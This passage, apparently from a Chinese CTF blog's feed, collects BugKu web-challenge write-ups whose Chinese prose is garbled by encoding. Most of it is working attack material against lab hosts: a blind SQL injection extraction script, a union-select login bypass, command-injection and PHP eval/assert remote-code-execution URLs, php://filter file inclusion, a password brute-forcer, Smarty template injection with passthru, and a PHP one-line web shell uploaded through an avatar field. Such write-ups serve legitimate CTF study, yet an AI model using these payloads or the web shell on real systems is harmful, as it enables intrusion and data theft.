<span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line"><span class="comment">#print(&quot;å¯†ç çš„é•¿åº¦æ˜¯&quot;+str(i))</span></span><br><span class="line"><span class="keyword">return</span> i</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_passwd</span>(<span class="params">url,data,cookie,uname,length</span>):</span><br><span class="line">password = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, length+<span class="number">1</span>):</span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz&#x27;</span>:</span><br><span class="line">uname = <span class="string">&quot;admin&#x27;-(ascii(mid((passwd)from(&quot;</span> + <span class="built_in">str</span>(i) + <span class="string">&quot;)))=&quot;</span> + <span class="built_in">str</span>(<span class="built_in">ord</span>(ch)) + <span class="string">&quot;)-&#x27;&quot;</span></span><br><span class="line">change_data(uname,data)</span><br><span class="line">r = requests.post(url=url, cookies=cookie, data=data)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;username error!!@_@&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">password += ch</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;password:&quot;</span>,password)</span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:11041/login.php&quot;</span></span><br><span class="line">headers = &#123;</span><br><span class="line"><span class="string">&#x27;User-Agent&#x27;</span>: <span class="string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:99.0) Gecko/20100101 Firefox/99.0&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookie = &#123;</span><br><span class="line"><span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;nnff401s86pvr720ouq5qe0k40&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">uname = <span class="string">&#x27;admin&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;uname&#x27;</span>:uname,</span><br><span class="line"><span class="string">&#x27;passwd&#x27;</span>:<span class="string">&#x27;123123&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">length = len_of_passwd(url,data,cookie,uname)</span><br><span class="line">get_passwd(url,data,cookie,uname,length)</span><br><span class="line"><span class="comment">#bukuctf:4dcc88f8f1bc05e7c2ad1a60288481a2</span></span><br></pre></td></tr></table></figure><p>ç™»é™†åè¾“å…¥å‘½ä»¤<code>&#123;cat,/flag&#125;</code>å³å¯è·å¾—flag</p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/qq_41696858/article/details/119081156">BugKu-Web-wp3</a></p></blockquote><h2 id="login2"><a href="#login2" class="headerlink" title="login2"></a>login2</h2><p>ç”¨burpæŠ“åŒ…å‘ç°æœ‰tipå­—æ®µ,base64è§£ç å³å¯å¾—åˆ°æç¤º</p><p><img src="https://s2.loli.net/2022/05/05/hHV4OeurRwjZ1vM.png" alt="login2_1.png"></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sql</span>=<span class="string">&quot;SELECT username,password FROM admin WHERE username=&#x27;&quot;</span>.<span class="variable">$username</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$row</span>) &amp;&amp; <span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>]===<span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>))&#123;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ„é€ <code>username=admin&#39; union select 1,md5(123)#   </code>å’Œ<code>password=123</code>å³å¯åˆ›å»ºä¸€ä¸ªä¸å­˜åœ¨çš„ç”¨æˆ·é€šè¿‡éªŒè¯ï¼Œè¿›å…¥åä½¿ç”¨å‘½ä»¤<code>123| cat /flag &gt; test</code>ï¼Œç„¶åè¿›å…¥ç½‘å€<code>http://114.67.175.224:15394/test</code>å³å¯è·å¾—flagã€‚</p><p><img src="https://s2.loli.net/2022/05/05/wByZDhxQitfTlrg.png" alt="login2_2.png"></p><blockquote><p>å‚è€ƒï¼š<a href="https://blog.csdn.net/weixin_58111246/article/details/123482301">Bugku-Web-wp4</a></p><p>è¿˜æœ‰åå¼¹shellçš„åšæ³•ï¼š<a href="https://www.jianshu.com/p/4f8d8d8b7b31">https://www.jianshu.com/p/4f8d8d8b7b31</a></p></blockquote><h2 id="sqlæ³¨å…¥"><a href="#sqlæ³¨å…¥" class="headerlink" title="sqlæ³¨å…¥"></a>sqlæ³¨å…¥</h2><p>ç›²çŒœè´¦å·<code>admin</code>å’Œå¯†ç <code>bugkuctf</code>ï¼Œç„¶åç›´æ¥æ‹¿åˆ°äº†flagã€‚</p><blockquote><p>å¤§ä½¬çš„æ³¨å…¥è¿‡ç¨‹ï¼š<a href="https://blog.csdn.net/plant1234/article/details/118033711">sqlæ³¨å…¥</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> BugKu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BugKu Web åˆ·é¢˜è®°å½•3</title>
      <link href="/2022/04/27/BugKu-Web3/"/>
      <url>/2022/04/27/BugKu-Web3/</url>
      
        <content type="html"><![CDATA[<h1 id="BugKu-Web-åˆ·é¢˜è®°å½•3"><a href="#BugKu-Web-åˆ·é¢˜è®°å½•3" class="headerlink" title="BugKu Web åˆ·é¢˜è®°å½•3"></a>BugKu Web åˆ·é¢˜è®°å½•3</h1><blockquote><p>å‚è€ƒï¼š</p><p><a href="https://www.php.net/exec">PHPç¨‹åºæ‰§è¡Œ</a></p><p><a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p><p><a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p><p><a href="https://www.jianshu.com/p/2dbb1b38de1e">BugKu-Web-wp3</a></p></blockquote><h2 id="game1"><a href="#game1" class="headerlink" title="game1"></a>game1</h2><p>ä¸€å±€æ¸¸æˆç»“æŸåï¼Œå‘ç°æŠ“åˆ°äº†ä¸€ä¸ªå¯ç–‘çš„æ•°æ®åŒ…</p><p><img src="https://s2.loli.net/2022/04/27/qpcmtIiEDoKwRuM.png" alt="game1_1.png"></p><p>çŒœæµ‹signå­—æ®µæ˜¯base64åŠ å¯†çš„ï¼Œä½†è§£ç åå‘ç°æ˜¯æ— ç”¨å­—ç¬¦ï¼Œåˆå¯¹scoreå­—æ®µå°è¯•base64åŠ å¯†ï¼Œå‘ç°25çš„base64ç æ˜¯<code>MjU=</code>ï¼Œæ•…çŒœæµ‹signå­—æ®µæœ¬è´¨ä¸Šæ˜¯ä¸æ˜¯<code>&#39;zM&#39;+&#39;base64_encode(score)&#39;+&#39;==&#39;</code>è¿™æ ·ç»„æˆçš„ï¼Œå‘é€åå‘ç°ç¡®å®å¯ä»¥å¾—åˆ°flag</p><p><img src="https://s2.loli.net/2022/04/27/c5I9fRCyYVqFkwi.png" alt="game1_2.png"></p><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h3 id="æ–¹æ³•1"><a href="#æ–¹æ³•1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å…ˆè¯•è¯•ä¼ å…¥å…¨å±€å˜é‡çœ‹çœ‹å…¶ä¸­å†…å®¹</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=$GLOBALS</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3mGOYDJhBH8264i.png" alt="eval1.png"></p><p>å¾ˆå¥½ï¼Œè¢«å˜²è®½äº†ã€‚evalä¼šæ‰§è¡Œä¼ å…¥å­—ç¬¦ä¸²ï¼Œæ•…æ„é€ payloadè®©å…¶æ‰§è¡Œå‘½ä»¤</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=);show_source(&#x27;flag.php&#x27;);var_dump(</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/4u1rN5TXjQaVF63.png" alt="eval2.png"></p><h3 id="æ–¹æ³•2"><a href="#æ–¹æ³•2" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨file</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:13624/?hello=file(&#x27;flag.php&#x27;)</span><br></pre></td></tr></table></figure><h2 id="source"><a href="#source" class="headerlink" title="source"></a>source</h2><p>æ‰«æå‘ç°æœ‰gitæ–‡ä»¶æ³„éœ²ï¼Œæ•…ä¸‹è½½gitæ–‡ä»¶ï¼ˆlinuxä¸‹ï¼‰</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">wget</span> -r http://114.67.175.224:19331/.git</span><br></pre></td></tr></table></figure><p>è¿›å…¥æ—¥å¿—ç›®å½•ä¸‹</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">cd</span> <span class="number">114.67.175.224:19331</span>/.git/logs</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹ä¿¡æ¯</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> reflog</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/9iGlevcpH3gEZjJ.png" alt="source1.png"></p><p>ä½¿ç”¨git showå‘½ä»¤æŸ¥çœ‹æ–‡ä»¶ï¼Œæœ€ç»ˆåœ¨40c6d51æ–‡ä»¶é‡Œæ‰¾åˆ°flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">git</span> show 40c6d51</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/jXeQsLpJgoF5ril.png" alt="source2.png"></p><h2 id="æ–‡ä»¶åŒ…å«"><a href="#æ–‡ä»¶åŒ…å«" class="headerlink" title="æ–‡ä»¶åŒ…å«"></a>æ–‡ä»¶åŒ…å«</h2><h3 id="æ–¹æ³•1-1"><a href="#æ–¹æ³•1-1" class="headerlink" title="æ–¹æ³•1"></a>æ–¹æ³•1</h3><p>å°è¯•æŸ¥çœ‹æºç </p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=php://filter/read=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure><p>base64è§£ç åè·å¾—æºç å’Œflag</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">    &lt;title&gt;Bugku-web&lt;/title&gt;</span><br><span class="line">    </span><br><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">if(!$_GET[file])&#123;echo &#x27;&lt;a href=&quot;./index.php?file=show.php&quot;&gt;click me? no&lt;/a&gt;&#x27;;&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(strstr($file,&quot;../&quot;)||stristr($file, &quot;tp&quot;)||stristr($file,&quot;input&quot;)||stristr($file,&quot;data&quot;))&#123;</span><br><span class="line">echo &quot;Oh no!&quot;;</span><br><span class="line">exit();</span><br><span class="line">&#125;</span><br><span class="line">include($file); </span><br><span class="line">//flag:flag&#123;ee54957897543831f6aa21d30f46913d&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;/html&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ–¹æ³•2-1"><a href="#æ–¹æ³•2-1" class="headerlink" title="æ–¹æ³•2"></a>æ–¹æ³•2</h3><p>ä¹Ÿå¯ä»¥ç›´æ¥æ„é€ è¯¥payloadè·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:10060/index.php?file=//flag</span><br></pre></td></tr></table></figure><h2 id="å¥½åƒéœ€è¦å¯†ç "><a href="#å¥½åƒéœ€è¦å¯†ç " class="headerlink" title="å¥½åƒéœ€è¦å¯†ç "></a>å¥½åƒéœ€è¦å¯†ç </h2><p>ç›´æ¥5ä½çº¯æ•°å­—çˆ†ç ´ï¼ˆå¯†ç æ˜¯12468)ï¼Œexpå¦‚ä¸‹</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">lens = <span class="number">5</span></span><br><span class="line"><span class="keyword">for</span> password <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="number">100000</span>):</span><br><span class="line">password = <span class="built_in">str</span>(password)</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">len</span>(password)&lt;lens):</span><br><span class="line">diff = lens-<span class="built_in">len</span>(password)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(diff):</span><br><span class="line">password = <span class="string">&#x27;0&#x27;</span> + password</span><br><span class="line">test = requests.post(<span class="string">&#x27;http://114.67.175.224:15735/&#x27;</span>,data=&#123;<span class="string">&#x27;pwd&#x27;</span>: password&#125;)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;å½“å‰æµ‹è¯•çš„å¯†ç ä¸ºï¼š&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(password)</span><br><span class="line"><span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> test.text:</span><br><span class="line">flag = re.findall(<span class="string">&quot;flag\&#123;(.*)?\&#125;&quot;</span>,test.text)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[+]æ­£ç¡®çš„å¯†ç ä¸ºï¼š&#x27;</span>,password)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;[*]flag&#123;&#x27;</span>+flag[<span class="number">0</span>]+<span class="string">&#x27;&#125;&#x27;</span>)</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/3dtQCz5cogAI9F4.png" alt="password.png"></p><h2 id="No-one-knows-regex-better-than-me"><a href="#No-one-knows-regex-better-than-me" class="headerlink" title="No one knows regex better than me"></a>No one knows regex better than me</h2><p>æ‰“å¼€ç½‘é¡µå³å¯è·å¾—æºç ï¼Œæœ¬åœ°åˆ†ææºç æµ‹è¯•å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$zero</span> = <span class="string">&quot;\\ZmxhZw==&quot;</span>; <span class="comment">//&#x27;ZmxhZw==&#x27;æ˜¯flagçš„base64ç¼–ç </span></span><br><span class="line"><span class="variable">$first</span>=<span class="string">&quot;ag/\\|.php&quot;</span>;</span><br><span class="line"><span class="variable">$second</span>=<span class="variable">$zero</span>.<span class="variable">$first</span>;</span><br><span class="line"><span class="comment">// echo $second;</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/Yeedo|wants|a|girl|friend|or|a|flag/i&quot;</span>,<span class="variable">$second</span>))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;[1]&quot;</span>;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$second</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\.\.|flag/&quot;</span>,<span class="variable">$key</span>))&#123; </span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Noooood hacker!&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;[2]&quot;</span>;</span><br><span class="line">        <span class="variable">$third</span>=<span class="variable">$first</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/\\|\056\160\150\x70/i&quot;</span>,<span class="variable">$third</span>))&#123; <span class="comment">// |.php</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[3]&quot;</span>;</span><br><span class="line">            <span class="variable">$end</span>=<span class="title function_ invoke__">substr</span>(<span class="variable">$third</span>,<span class="number">5</span>);</span><br><span class="line">            <span class="comment">// echo $zero;</span></span><br><span class="line">            <span class="comment">// echo $end;</span></span><br><span class="line">            <span class="comment">// highlight_file(base64_decode($zero).$end);//maybe flag in flag.php</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">base64_decode</span>(<span class="variable">$zero</span>).<span class="variable">$end</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">// highlight_file(__FILE__);</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;fail!!!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å†™è„šæœ¬æäº¤å³å¯ï¼Œexpå¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://114.67.175.224:17373/&quot;</span></span><br><span class="line">data = &#123;</span><br><span class="line"><span class="string">&#x27;zero&#x27;</span>:<span class="string">&quot;\\ZmxhZw==&quot;</span>, <span class="comment">#ZmxhZw==</span></span><br><span class="line"><span class="string">&#x27;first&#x27;</span>:<span class="string">&quot;ag/\\|.php&quot;</span> <span class="comment">#aaaa|.php</span></span><br><span class="line">&#125;</span><br><span class="line">response = requests.post(url=url,data=data);</span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/V5Yd92Ri3HZNUvW.png" alt="better_re.png"></p><h2 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h2><p>å…ˆæŸ¥çœ‹æç¤ºï¼Œåˆ†æåå¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$poc</span> = <span class="string">&quot;a#s#s#e#r#t&quot;</span>;</span><br><span class="line"><span class="variable">$poc_1</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;#&quot;</span>,<span class="variable">$poc</span>);</span><br><span class="line"><span class="comment">//print_r($poc_1);</span></span><br><span class="line"><span class="variable">$poc_2</span>=<span class="variable">$poc_1</span>[<span class="number">0</span>].<span class="variable">$poc_1</span>[<span class="number">1</span>].<span class="variable">$poc_1</span>[<span class="number">2</span>].<span class="variable">$poc_1</span>[<span class="number">3</span>].<span class="variable">$poc_1</span>[<span class="number">4</span>].<span class="variable">$poc_1</span>[<span class="number">5</span>];</span><br><span class="line"><span class="comment">//print_r($poc_2);</span></span><br><span class="line"><span class="variable">$poc_2</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;s&#x27;</span>]); <span class="comment">//assert($_GET[&#x27;s&#x27;])</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>å‘ç°ä¼ å…¥så³å¯ï¼Œæ•…æ„é€ payloadï¼Œå…ˆæ‰§è¡Œlså‘½ä»¤æŸ¥çœ‹æœ‰å“ªäº›æ–‡ä»¶</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27ls%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/esdpv8BWliSRng4.png" alt="shell1.png"></p><p>æŸ¥çœ‹è¯¥txtæ–‡ä»¶å³å¯è·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:11841/?s=system(%27cat%20flaga15808abee46a1d5.txt%27)</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/8DhOGmWrz93K6wd.png" alt="shell2.png"></p><h2 id="èªæ˜çš„php"><a href="#èªæ˜çš„php" class="headerlink" title="èªæ˜çš„php"></a>èªæ˜çš„php</h2><p>éšæ„ä¼ å‚å¾—åˆ°æºç æç¤º</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;./libs/Smarty.class.php&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;pass a parameter and maybe the flag file&#x27;s filename is random :&gt;&quot;</span>;</span><br><span class="line"><span class="variable">$smarty</span> = <span class="keyword">new</span> <span class="title class_">Smarty</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>)&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="string">&#x27;index.php&#x27;</span>);</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$_GET</span> AS <span class="variable">$key</span> =&gt; <span class="variable">$value</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">print</span> <span class="variable">$key</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/flag|\/flag/i&quot;</span>, <span class="variable">$value</span>))&#123;          </span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/system|readfile|gz|exec|eval|cat|assert|file|fgets/i&quot;</span>, <span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&#x27;./template.html&#x27;</span>);                 </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$smarty</span>-&gt;<span class="title function_ invoke__">display</span>(<span class="string">&quot;eval:&quot;</span>.<span class="variable">$value</span>);</span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°systemç­‰å‘½ä»¤å·²ç»è¢«ç¦ç”¨äº†ï¼Œæ•…ä½¿ç”¨passthruæ¥æ‰§è¡Œå‘½ä»¤</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27ls%20-al%20/%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/wRp7dIuoJKUT8AE.png" alt="php1.png"></p><p>å‘ç°ä¸€ä¸ªå¾ˆå¯ç–‘æ–‡ä»¶ï¼Œå»è¯»å–å³å¯è·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:15783/index.php?a=&#123;passthru(%27tac%20/_7782%27)&#125;</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/NYuIkAJXHZKewjq.png" alt="php2.png"></p><blockquote><p>æœ‰å…³ç¨‹åºæ‰§è¡Œå¯çœ‹æ­¤ç½‘ç«™ï¼š<a href="https://www.php.net/exec">PHPç¨‹åºæ‰§è¡Œ</a></p><p>å‚è€ƒwpï¼š<a href="https://zhuanlan.zhihu.com/p/401583380">BugKu-Web-wp1</a></p></blockquote><h2 id="xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"><a href="#xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº" class="headerlink" title="xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº"></a>xxxäºŒæ‰‹äº¤æ˜“å¸‚åœº</h2><p>çœ‹äº†ä¸€åœˆå‘ç°æ²¡ä»€ä¹ˆä¸œè¥¿ï¼Œæ³¨å†Œè´¦å·ç™»å½•ï¼Œå‘ç°å¯ä»¥ä¸Šä¼ å¤´ï¼Œæ•…è¿›è¡Œå›¾ç‰‡ä¸Šä¼ å¹¶æŠ“åŒ…ï¼Œå‘ç°å›¾ç‰‡æ˜¯ç”¨base64ç¼–ç çš„ï¼Œæ•…æ„é€ ä¸€å¥è¯æœ¨é©¬ä¼ è¿›å»ï¼ˆæ³¨æ„ä½¿ç”¨base64ç¼–ç ï¼Œä¸”å‰é¢çš„jpegè¦æ”¹ä¸ºphpï¼‰</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/m6kYFzCrnJpso98.png" alt="xxxx1.png"></p><p>ç”¨ä¸­å›½èšå‰‘è¿æ¥ä¼ å…¥phpæ–‡ä»¶åœ°å€ï¼ˆå¯†ç ä¸ºcmdï¼‰ï¼Œç¿»æ‰¾åè·å¾—flagã€‚</p><p><img src="https://s2.loli.net/2022/04/27/zIYa4Xc39OCHf7L.png" alt="xxxx2.png"></p><h2 id="é—ªç”µåå…­é­"><a href="#é—ªç”µåå…­é­" class="headerlink" title="é—ªç”µåå…­é­"></a>é—ªç”µåå…­é­</h2><p>æ‰“å¼€ç½‘é¡µå³å¯è·å¾—æºç ï¼Œåˆ†æåæ„é€ payloadå³å¯è·å¾—flag</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line">http://114.67.175.224:17903/?flag=$a=%27flaa%27;$a&#123;3&#125;=%27g%27;?%3E%3C?=$$a;?%3Ebbbbbbbbbbbbbbbbbb</span><br></pre></td></tr></table></figure><p><img src="https://s2.loli.net/2022/04/27/zra8M3yHTnWsIeo.png" alt="teacherma.png"></p><blockquote><p>å‚è€ƒwpï¼š<a href="https://blog.csdn.net/weixin_58111246/article/details/123971455?spm=1001.2014.3001.5501">BugKu-Web-wp2</a></p></blockquote><h2 id="sodirty"><a href="#sodirty" class="headerlink" title="sodirty"></a>sodirty</h2><p>ç”¨å¾¡å‰‘æ‰«ä¸€éå‘ç°<code>www.zip</code></p><p><img src="https://s2.loli.net/2022/04/27/Iv5dpC3bAocHKXt.png" alt="dirty1.png"></p><p>è§£å‹åï¼Œé‡ç‚¹çœ‹routesä¸‹çš„index.jsæ–‡ä»¶ï¼Œå…¶ä¸­ï¼Œgetflagæ˜¯æˆ‘ä»¬è·å–flagçš„åœ°æ–¹</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/getflag&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">password</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">password</span> === req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">password</span>)&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&quot;ç™»å½•å¤±è´¥&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span>.<span class="property">age</span> &gt; <span class="number">79</span>)&#123;  <span class="comment">//  age&lt;=79</span></span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;ç³Ÿè€å¤´å­åæ»´å¾ˆ&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">let</span> key = req.<span class="property">body</span>.<span class="property">key</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">let</span> password = req.<span class="property">body</span>.<span class="property">password</span>.<span class="title function_">toString</span>();</span><br><span class="line">        <span class="keyword">if</span>(<span class="title class_">Admin</span>[key] === password)&#123;</span><br><span class="line">            res.<span class="title function_">send</span>(process.<span class="property">env</span>.<span class="property">flag</span> ? process.<span class="property">env</span>.<span class="property">flag</span> : <span class="string">&quot;flag&#123;test&#125;&quot;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;å¯†ç é”™è¯¯ï¼Œè¯·ä½¿ç”¨ç®¡ç†å‘˜ç”¨æˆ·åç™»å½•.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>updateå¯ä»¥æ›´æ–°é”®å€¼å¯¹ï¼Œæ˜¯æˆ‘ä»¬ä¸»è¦è¦åˆ©ç”¨çš„å‡½æ•°</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">router.<span class="title function_">post</span>(<span class="string">&quot;/update&quot;</span>, <span class="keyword">function</span> (<span class="params">req, res, next</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(req.<span class="property">session</span>.<span class="property">challenger</span> === <span class="literal">undefined</span>)&#123;</span><br><span class="line">        res.<span class="title function_">redirect</span>(<span class="string">&#x27;/reg&#x27;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (req.<span class="property">body</span>.<span class="property">attrkey</span> === <span 